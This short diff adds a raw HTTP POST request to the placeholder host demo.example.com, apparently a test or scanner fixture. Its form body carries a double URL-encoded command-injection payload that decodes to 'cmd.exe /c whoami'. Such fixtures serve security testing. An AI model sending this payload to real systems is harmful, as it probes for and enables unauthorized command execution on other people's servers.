@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+Connection: close
+
+s=d%253Dcmd.exe%2B%252Fc%2Bwhoami
